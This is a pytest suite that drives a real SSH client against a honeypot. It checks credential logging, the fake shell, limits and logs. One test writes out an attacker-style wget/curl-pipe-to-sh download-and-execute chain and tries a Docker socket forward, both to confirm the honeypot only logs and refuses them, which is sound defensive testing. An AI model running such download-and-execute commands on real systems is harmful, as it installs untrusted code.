"""End-to-end tests: a real asyncssh client against the honeypot on 127.0.0.1."""

from __future__ import annotations

import asyncio
import contextlib
import json
import re
from pathlib import Path

import asyncssh
import pytest

from conftest import client, eventually


async def _read_banner(port: int) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        return await asyncio.wait_for(reader.readline(), 5)
    finally:
        writer.close()


async def _counting_listener():
    """A TCP listener on 127.0.0.1 that counts connections. Used to prove that
    nothing (wget, port forwarding, ...) ever connects out on an attacker's behalf."""
    hits: list[int] = []

    async def handle(reader, writer):
        hits.append(1)
        writer.close()

    server = await asyncio.start_server(handle, "127.0.0.1", 0)
    return server, server.sockets[0].getsockname()[1], hits


async def _shell(conn, script: str, timeout: float = 5.0) -> str:
    proc = await conn.create_process(term_type="xterm-256color", term_size=(120, 40))
    proc.stdin.write(script)
    return await asyncio.wait_for(proc.stdout.read(), timeout)


# -- authentication ---------------------------------------------------------------


async def test_banner_and_rejected_password_is_recorded(start_honeypot):
    hp = await start_honeypot()
    assert await _read_banner(hp.port) == b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\r\n"

    with pytest.raises(asyncssh.PermissionDenied):
        async with hp.connect("admin", "hunter2"):
            pass

    rows = await eventually(lambda: hp.rows("SELECT * FROM auth_attempts"))
    assert rows[0]["username"] == "admin"
    assert rows[0]["password"] == "hunter2"
    assert rows[0]["method"] == "password"
    assert rows[0]["success"] == 0
    assert rows[0]["src_ip"] == "127.0.0.1"

    sessions = await eventually(
        lambda: hp.rows(
            "SELECT * FROM sessions WHERE ended IS NOT NULL AND client_version IS NOT NULL"
        )
    )
    s = sessions[-1]
    assert s["client_version"].startswith("SSH-2.0-AsyncSSH_")
    assert re.fullmatch(r"[0-9a-f]{32}", s["hassh"])
    kex, enc, mac, comp = s["hassh_algorithms"].split(";")
    assert "curve25519-sha256" in kex and "aes128-ctr" in enc and "hmac-sha2-256" in mac
    assert "none" in comp
    assert s["kex"] and s["kex"] in kex.split(",")
    assert s["cipher"] and s["logged_in"] == 0 and s["auth_attempts"] == 1
    assert hp.notifier.events == []


async def test_public_key_offer_is_recorded_and_rejected(start_honeypot):
    hp = await start_honeypot(
        auth={"policy": "credentials", "credentials": [{"username": "*", "password": "*"}]}
    )  # even an accept-all policy never accepts keys
    key = asyncssh.generate_private_key("ssh-ed25519")
    with pytest.raises(asyncssh.PermissionDenied):
        async with client(
            hp.port, username="deploy", client_keys=[key], preferred_auth="publickey"
        ):
            pass
    rows = await eventually(lambda: hp.rows("SELECT * FROM auth_attempts"))
    assert rows[0]["method"] == "publickey"
    assert rows[0]["key_type"] == "ssh-ed25519"
    assert rows[0]["key_fingerprint"] == key.get_fingerprint("sha256")
    assert rows[0]["success"] == 0


async def test_after_attempts_policy(start_honeypot):
    hp = await start_honeypot(auth={"policy": "after_attempts", "accept_after": 3})
    for pw in ("one", "two"):
        with pytest.raises(asyncssh.PermissionDenied):
            async with hp.connect("root", pw):
                pass
    async with hp.connect("root", "three") as conn:
        assert (await conn.run("whoami")).stdout == "root\n"
    # The same credentials keep working for that source, like a real weak password.
    async with hp.connect("root", "three") as conn:
        pass
    await eventually(lambda: len(hp.notifier.events) == 2)
    assert hp.notifier.events[0].username == "root"


async def test_credentials_policy(start_honeypot):
    hp = await start_honeypot(
        auth={"policy": "credentials", "credentials": [{"username": "admin", "password": "admin"}]}
    )
    with pytest.raises(asyncssh.PermissionDenied):
        async with hp.connect("admin", "nope"):
            pass
    async with hp.connect("admin", "admin") as conn:
        assert "uid=1001(admin)" in (await conn.run("id")).stdout
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE logged_in = 1"))
    assert s[0]["login_user"] == "admin" and s[0]["login_password"] == "admin"


async def test_too_many_attempts_disconnects(start_honeypot):
    hp = await start_honeypot(auth={"max_attempts_per_connection": 2})

    class Sprayer(asyncssh.SSHClient):
        n = 0

        def password_auth_requested(self):
            Sprayer.n += 1
            return f"pw{Sprayer.n}"

    with pytest.raises((asyncssh.Error, OSError)):
        async with client(hp.port, username="root", password=None, client_factory=Sprayer):
            pass
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["end_reason"] == "too many auth attempts"
    assert s[0]["auth_attempts"] == 2


# -- fake shell -----------------------------------------------------------------------

ACCEPT_ALL = {"policy": "credentials", "credentials": [{"username": "*", "password": "*"}]}


async def test_interactive_fake_shell(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL, hostname="db-01")
    async with hp.connect("root", "toor") as conn:
        out = await _shell(conn, "whoami\nuname -a\nfoobar --x\ncd /tmp\npwd\nexit\n")
    assert "Welcome to Ubuntu 24.04" in out
    assert "root@db-01:~# whoami\r\nroot\r\n" in out
    assert "Linux db-01 6.8.0-49-generic" in out
    assert "foobar: command not found" in out
    assert "root@db-01:/tmp# pwd\r\n/tmp\r\n" in out
    assert out.rstrip().endswith("logout")

    cmds = await eventually(lambda: hp.rows("SELECT * FROM commands ORDER BY id"))
    assert [c["command"] for c in cmds] == [
        "whoami", "uname -a", "foobar --x", "cd /tmp", "pwd", "exit",
    ]  # fmt: skip
    assert [c["known"] for c in cmds] == [1, 1, 0, 1, 1, 1]
    assert all(c["kind"] == "shell" for c in cmds)
    assert [c["elapsed"] for c in cmds] == sorted(c["elapsed"] for c in cmds)

    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["logged_in"] == 1 and s[0]["term"] == "xterm-256color" and s[0]["commands"] == 6
    assert len(hp.notifier.events) == 1


async def test_exec_request(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL)
    async with hp.connect("root", "x") as conn:
        result = await conn.run("id; echo $HOME; cat /etc/hostname", check=False)
    assert result.stdout == "uid=0(root) gid=0(root) groups=0(root)\n/root\nweb-prod-01\n"
    assert result.exit_status == 0
    req = await eventually(lambda: hp.rows("SELECT * FROM requests WHERE kind = 'exec'"))
    assert req[0]["detail"] == "id; echo $HOME; cat /etc/hostname" and req[0]["accepted"] == 1
    cmds = hp.rows("SELECT kind, command FROM commands")
    assert cmds == [{"kind": "exec", "command": "id; echo $HOME; cat /etc/hostname"}]


async def test_wget_and_curl_are_only_logged(start_honeypot):
    target, port, hits = await _counting_listener()
    hp = await start_honeypot(auth=ACCEPT_ALL)
    url1 = f"http://127.0.0.1:{port}/bins/x86.sh"
    url2 = f"http://127.0.0.1:{port}/y"
    async with target, hp.connect("root", "x") as conn:
        result = await conn.run(
            f"cd /tmp; wget {url1}; curl -s -o y {url2} | sh; chmod +x x86.sh; ./x86.sh",
            check=False,
        )
        await asyncio.sleep(0.3)
    assert hits == []  # nothing connected to the "malware server"
    assert f"Connecting to 127.0.0.1:{port}... failed: Connection refused." in result.stdout
    assert "./x86.sh: No such file or directory" in result.stdout
    downloads = await eventually(lambda: hp.rows("SELECT tool, url FROM downloads ORDER BY id"))
    assert downloads == [{"tool": "wget", "url": url1}, {"tool": "curl", "url": url2}]


async def test_forwarding_sftp_and_subsystems_are_refused(start_honeypot):
    target, port, hits = await _counting_listener()
    hp = await start_honeypot(auth=ACCEPT_ALL)
    async with target, hp.connect("root", "x") as conn:
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.open_connection("127.0.0.1", port)
        with pytest.raises(asyncssh.ChannelListenError):
            await conn.forward_remote_port("127.0.0.1", 0, "127.0.0.1", port)
        with pytest.raises(asyncssh.Error):
            await conn.start_sftp_client()
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.open_unix_connection("/var/run/docker.sock")
        await asyncio.sleep(0.3)
    assert hits == []
    kinds = await eventually(
        lambda: (
            {(r["kind"], r["accepted"]) for r in hp.rows("SELECT kind, accepted FROM requests")}
            if len(hp.rows("SELECT * FROM requests")) >= 4
            else None
        )
    )
    assert kinds >= {
        ("direct-tcpip", 0), ("tcpip-forward", 0), ("subsystem", 0), ("direct-streamlocal", 0),
    }  # fmt: skip
    detail = hp.rows("SELECT detail FROM requests WHERE kind = 'subsystem'")[0]["detail"]
    assert detail == "sftp"


async def test_request_spam_is_cut_off(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL)
    async with hp.connect("root", "x") as conn:
        for i in range(150):
            with contextlib.suppress(asyncssh.Error, OSError):
                await conn.open_connection("10.0.0.1", 1000 + i)
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["end_reason"] == "request limit"
    assert hp.rows("SELECT COUNT(*) AS n FROM requests")[0]["n"] == 100


# -- limits ---------------------------------------------------------------------------


async def test_max_commands_limit(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL, limits={"max_commands": 3})
    async with hp.connect("root", "x") as conn:
        out = await _shell(conn, "id\nid\nid\nid\nid\n")
    assert out.count("uid=0(root)") == 3
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["end_reason"] == "command limit" and s[0]["commands"] == 3


async def test_max_input_bytes_limit(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL, limits={"max_input_bytes": 256})
    async with hp.connect("root", "x") as conn:
        await _shell(conn, "echo " + "A" * 300 + "\n")
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["end_reason"] == "input limit"
    assert hp.rows("SELECT COUNT(*) AS n FROM commands")[0]["n"] == 0


async def test_long_line_is_truncated(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL, limits={"max_line_length": 64})
    async with hp.connect("root", "x") as conn:
        proc = await conn.create_process()  # no PTY: raw input, our own line splitting
        proc.stdin.write("echo " + "B" * 200)
        proc.stdin.write_eof()
        await asyncio.wait_for(proc.stdout.read(), 5)
    cmds = await eventually(lambda: hp.rows("SELECT command FROM commands"))
    assert all(len(c["command"]) <= 64 for c in cmds)


async def test_idle_timeout(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL, limits={"idle_timeout": 0.5})
    async with hp.connect("root", "x") as conn:
        proc = await conn.create_process(term_type="xterm")
        await asyncio.wait_for(proc.wait_closed(), 5)
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["end_reason"] == "idle timeout"


async def test_max_session_duration(start_honeypot):
    hp = await start_honeypot(
        auth=ACCEPT_ALL, limits={"max_session_duration": 1.0, "idle_timeout": 60}
    )
    async with hp.connect("root", "x") as conn:
        proc = await conn.create_process(term_type="xterm")

        async def keep_typing():
            while not proc.stdout.at_eof():
                proc.stdin.write("pwd\n")
                await asyncio.sleep(0.1)

        typing = asyncio.create_task(keep_typing())
        await asyncio.wait_for(proc.wait_closed(), 5)
        typing.cancel()
    s = await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    assert s[0]["end_reason"] == "max duration"
    assert 0.9 <= s[0]["ended"] - s[0]["started"] < 3


async def test_login_timeout_closes_silent_clients(start_honeypot):
    hp = await start_honeypot(limits={"login_timeout": 0.5})
    reader, writer = await asyncio.open_connection("127.0.0.1", hp.port)
    try:
        await reader.readline()  # banner; then say nothing
        rest = await asyncio.wait_for(reader.read(), 5)  # returns at EOF
        assert reader.at_eof()
        assert len(rest) < 4096
    finally:
        writer.close()


@pytest.mark.parametrize("limits", [{"max_connections_per_ip": 2}, {"max_connections": 2}])
async def test_connection_limits(start_honeypot, limits):
    hp = await start_honeypot(auth=ACCEPT_ALL, limits=limits)
    async with hp.connect("root", "x"), hp.connect("root", "x"):
        with pytest.raises((asyncssh.Error, OSError)):
            async with hp.connect("root", "x"):
                pass
        assert hp.hp.refused == 1
        assert hp.hp.total_active == 2
    await eventually(lambda: hp.hp.total_active == 0)
    assert hp.hp.active == {}
    # Refused connections are not stored, so a flood cannot grow the database.
    await eventually(lambda: len(hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL")) == 2)
    assert len(hp.rows("SELECT * FROM sessions")) == 2
    async with hp.connect("root", "x"):  # slots are released again
        pass


async def test_session_channel_limit(start_honeypot):
    hp = await start_honeypot(auth=ACCEPT_ALL, limits={"max_channels": 1})
    async with hp.connect("root", "x") as conn:
        await conn.run("true")
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.run("true")


# -- logs -----------------------------------------------------------------------------


async def test_auth_log_and_json_log(start_honeypot):
    hp = await start_honeypot(auth={"valid_users": ["root"]})
    with pytest.raises(asyncssh.PermissionDenied):
        async with hp.connect("admin", "s3cr3t-password"):
            pass
    with pytest.raises(asyncssh.PermissionDenied):
        async with hp.connect("root", "s3cr3t-password"):
            pass
    await eventually(lambda: hp.rows("SELECT * FROM sessions WHERE ended IS NOT NULL"))
    text = await eventually(
        lambda: (t := Path(hp.cfg.auth_log).read_text(encoding="utf-8")).count("Failed") == 2 and t
    )
    assert re.search(
        r" honeypot sshd\[\d+\]: Invalid user admin from 127\.0\.0\.1 port \d+\n", text
    )
    assert re.search(
        r"Failed password for invalid user admin from 127\.0\.0\.1 port \d+ ssh2", text
    )
    assert re.search(r"Failed password for root from 127\.0\.0\.1 port \d+ ssh2", text)
    assert "s3cr3t" not in text  # like sshd, never log passwords

    lines = Path(hp.cfg.json_log).read_text(encoding="utf-8").splitlines()
    events = [json.loads(line) for line in lines]
    kinds = [e["event"] for e in events]
    assert {"session.connect", "session.client", "auth.failed", "session.closed"} <= set(kinds)
    failed = [e for e in events if e["event"] == "auth.failed"]
    assert failed[0]["password"] == "s3cr3t-password"
